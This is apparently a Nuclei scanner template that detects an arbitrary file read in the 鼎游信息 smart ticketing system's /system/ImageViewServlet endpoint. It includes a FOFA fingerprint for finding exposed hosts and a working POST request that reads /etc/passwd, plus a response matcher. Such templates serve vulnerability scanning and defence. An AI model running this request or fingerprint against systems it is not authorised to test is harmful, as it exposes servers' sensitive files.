id: DingYouXinXi-ZhiHuiPiaoWu-ImageViewServlet-File-Reading

info:
  name: 鼎游信息智慧票务系统 ImageViewServlet 任意文件读取
  author: HuanXiong
  severity: medium
  description: |-
    fofa: body="/book/showgoodsIndex.action"
    鼎游信息智慧票务系统 /system/ImageViewServlet 接口存在任意文件读取漏洞,攻击者可利用此漏洞，未经授权地读取服务器上的任意文件，包括但不限于系统配置文件和数据库配置文件等敏感信息， 成功利用此漏洞可能导致企业内部敏感数据泄露，对系统的机密性和完整性构成潜在威胁。
  reference:
    - 
  tags: file-reading, dingyou

http:
  - raw:
      - |-
        POST /system/ImageViewServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36

        imgurl=/etc/passwd

    matchers:
      - type: dsl
        name: 任意文件读取
        dsl:
          - "status_code == 200 && contains_all(body, 'root:x:', 'bin:x:', '/sbin/nologin')"